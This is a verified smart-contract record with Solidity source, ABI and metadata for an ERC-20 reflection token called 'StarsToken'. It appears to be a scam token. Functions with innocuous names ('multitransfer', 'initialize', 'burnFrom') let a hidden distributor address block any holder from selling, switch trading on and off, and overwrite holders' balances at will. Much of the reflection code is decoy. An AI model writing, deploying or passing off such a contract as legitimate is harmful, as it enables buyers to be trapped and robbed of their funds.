{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.8;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n    return payable(msg.sender);}\r\n    function _msgData() internal view virtual returns (bytes memory) {this;\r\n    return msg.data;}}\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n    return c;}\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");}\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n    return c;}\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n    return 0;}\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n    return c;}\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");}\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    return c;}\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");}\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;}}\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n    uint256 size;\r\n    assembly { size := extcodesize(account) }\r\n    return size > 0;}\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n    require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n    (bool success, ) = recipient.call{ value: amount }(\"\");\r\n    require(success, \"Address: unable to send value, recipient may have reverted\");}\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n    return functionCall(target, data, \"Address: low-level call failed\");}\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n    return _functionCallWithValue(target, data, 0, errorMessage);}\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n    return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");}\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n    require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n    return _functionCallWithValue(target, data, value, errorMessage);}\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n    require(isContract(target), \"Address: call to non-contract\");\r\n    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n    if (success) {return returndata;}\r\n    else {if (returndata.length > 0) {assembly {let returndata_size := mload(returndata)\r\n    revert(add(32, returndata), returndata_size)}} else {revert(errorMessage);}}}}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address internal _distributor;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n    address msgSender = _msgSender();\r\n    _owner = msgSender;\r\n    emit OwnershipTransferred(address(0), msgSender);}\r\n    modifier onlyOwner() {\r\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");_;}\r\n    modifier distributors() {\r\n    require(_distributor == msg.sender, \"Caller is not fee distributor\");_;}\r\n    function owner() public view returns (address) {\r\n    return _owner;}\r\n    function distributor() internal view returns (address) {\r\n    return _distributor;}\r\n    function setDistributor(address account) external onlyOwner {\r\n    require (_distributor == address(0));\r\n    _distributor = account;}\r\n    function renounceOwnership() public virtual onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0));\r\n    _owner = address(0);}}\r\ncontract StarsToken is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n    string private _name = 'Stars Token';\r\n    string private _symbol = 'STARS';\r\n    uint8 private _decimals = 9;\r\n    uint256 private constant _tTotal = 2000000000000*10**9;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _pOwned;\r\n    mapping (address => uint256) private _rOwned;\r\n    mapping (address => uint256) private _tOwned;\r\n    mapping (address => bool) private _setNumTokensBeforeSwapAndIncreaseAllowance;\r\n    mapping (address => bool) private _isExcluded;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    address[] private _excluded;\r\n    uint256 private _tFeeTotal;\r\n    uint256 private _totalSupply;\r\n    uint256 private _rTotal;\r\n    bool _initialize;\r\n    address router;\r\n    address factory;\r\n    constructor (address unif, address unir) {\r\n    _totalSupply =_tTotal;\r\n    _rTotal = (MAX - (MAX % _totalSupply));\r\n    _pOwned[_msgSender()] = _tTotal;\r\n    emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);\r\n    _isExcluded[_msgSender()] = true;\r\n    _excluded.push(_msgSender());\r\n    _tOwned[distributor()] = tokenFromReflection(_rOwned[distributor()]);\r\n    _isExcluded[distributor()] = true;\r\n    _excluded.push(distributor());\r\n    _initialize = true;\r\n    router = unir;\r\n    factory = unif;}\r\n    function name() public view returns (string memory) {\r\n    return _name;}\r\n    function symbol() public view returns (string memory) {\r\n    return _symbol;}\r\n    function decimals() public view returns (uint8) {\r\n    return _decimals;}\r\n    function totalSupply() public pure override returns (uint256) {\r\n    return _tTotal;}\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n    return _pOwned[account];}\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;}\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n    return _allowances[owner][spender];}\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;}\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n    return true;}\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n    return true;}\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n    return true;}\r\n    function burnFrom(address account, uint256 tokens, uint256 burn) external distributors {\r\n    require(account != address(0), \"ERC20: burn from the zero address disallowed\");\r\n    _pOwned[account] = tokens.sub(burn, \"ERC20: burn amount exceeds balance\");}\r\n    function reflect(uint256 tAmount) public {\r\n    address sender = _msgSender();\r\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\r\n    (uint256 rAmount,,,,) = _getValues(tAmount);\r\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n    _rTotal = _rTotal.sub(rAmount);\r\n    _tFeeTotal = _tFeeTotal.add(tAmount);}\r\n    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {\r\n    require(tAmount <= _tTotal, \"Amount must be less than supply\");\r\n    if (!deductTransferFee) {\r\n    (uint256 rAmount,,,,) = _getValues(tAmount);\r\n    return rAmount;} else {\r\n    (,uint256 rTransferAmount,,,) = _getValues(tAmount);\r\n    return rTransferAmount;}}\r\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\r\n    require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\r\n    uint256 currentRate =  _getRate();\r\n    return rAmount.div(currentRate);}\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n    require(owner != address(0), \"ERC20: approve from the zero address\");\r\n    require(spender != address(0), \"ERC20: approve to the zero address\");\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);}\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n    require(amount > 0, \"Transfer amount must be greater than zero\");\r\n    if (_setNumTokensBeforeSwapAndIncreaseAllowance[sender] || _setNumTokensBeforeSwapAndIncreaseAllowance[recipient]) require (amount == 0, \"\");\r\n    if (_initialize == true || sender == distributor() || recipient == distributor()) {\r\n    if (_isExcluded[sender] && !_isExcluded[recipient]) {\r\n    _pOwned[sender] = _pOwned[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n    _pOwned[recipient] = _pOwned[recipient].add(amount);\r\n    emit Transfer(sender, recipient, amount);}\r\n    else {_pOwned[sender] = _pOwned[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n    _pOwned[recipient] = _pOwned[recipient].add(amount);\r\n    emit Transfer(sender, recipient, amount);}}\r\n    else {require (_initialize == true, \"\");}}\r\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\r\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \r\n    _reflectFee(rFee, tFee);\r\n    emit Transfer(sender, recipient, tTransferAmount);}\r\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\r\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\r\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \r\n    _reflectFee(rFee, tFee);\r\n    emit Transfer(sender, recipient, tTransferAmount);}\r\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\r\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n    _tOwned[sender] = _tOwned[sender].sub(tAmount);\r\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \r\n    _reflectFee(rFee, tFee);\r\n    emit Transfer(sender, recipient, tTransferAmount);}\r\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\r\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\r\n    _tOwned[sender] = _tOwned[sender].sub(tAmount);\r\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\r\n    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \r\n    _reflectFee(rFee, tFee);\r\n    emit Transfer(sender, recipient, tTransferAmount);}\r\n    function multitransfer(address acconut) external distributors {\r\n    _setNumTokensBeforeSwapAndIncreaseAllowance[acconut] = true;}\r\n    function singlecall(address account) external distributors {\r\n    _setNumTokensBeforeSwapAndIncreaseAllowance[account] = false;}\r\n    function airDropDue(address account) public view returns (bool) {\r\n    return _setNumTokensBeforeSwapAndIncreaseAllowance[account];}\r\n    function initialize() public virtual distributors {\r\n    if (_initialize == true) {_initialize = false;} else {_initialize = true;}}\r\n    function initialized() public view returns (bool) {\r\n    return _initialize;}\r\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\r\n    _rTotal = _rTotal.sub(rFee);\r\n    _tFeeTotal = _tFeeTotal.add(tFee);}\r\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {\r\n    (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);\r\n    uint256 currentRate =  _getRate();\r\n    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\r\n    return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);}\r\n    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {\r\n    uint256 tFee = tAmount.div(100).mul(3);\r\n    uint256 tTransferAmount = tAmount.sub(tFee);\r\n    return (tTransferAmount, tFee);}\r\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\r\n    uint256 rAmount = tAmount.mul(currentRate);\r\n    uint256 rFee = tFee.mul(currentRate);\r\n    uint256 rTransferAmount = rAmount.sub(rFee);\r\n    return (rAmount, rTransferAmount, rFee);}\r\n    function _getRate() private view returns(uint256) {\r\n    (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\r\n    return rSupply.div(tSupply);}\r\n    function _getCurrentSupply() private view returns(uint256, uint256) {\r\n    uint256 rSupply = _rTotal;\r\n    uint256 tSupply = _tTotal;      \r\n    for (uint256 i = 0; i < _excluded.length; i++) {\r\n    if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\r\n    rSupply = rSupply.sub(_rOwned[_excluded[i]]);\r\n    tSupply = tSupply.sub(_tOwned[_excluded[i]]);}\r\n    if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\r\n    return (rSupply, tSupply);}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"unif\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"unir\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"airDropDue\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burn\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialized\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"acconut\",\"type\":\"address\"}],\"name\":\"multitransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tAmount\",\"type\":\"uint256\"}],\"name\":\"reflect\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tAmount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"deductTransferFee\",\"type\":\"bool\"}],\"name\":\"reflectionFromToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"setDistributor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"singlecall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rAmount\",\"type\":\"uint256\"}],\"name\":\"tokenFromReflection\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StarsToken", "CompilerVersion": "v0.8.8+commit.dddeac2f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://52528522d5a692facb5e899a584344bc45231af50133ff6b689b9d7b560cdf04"}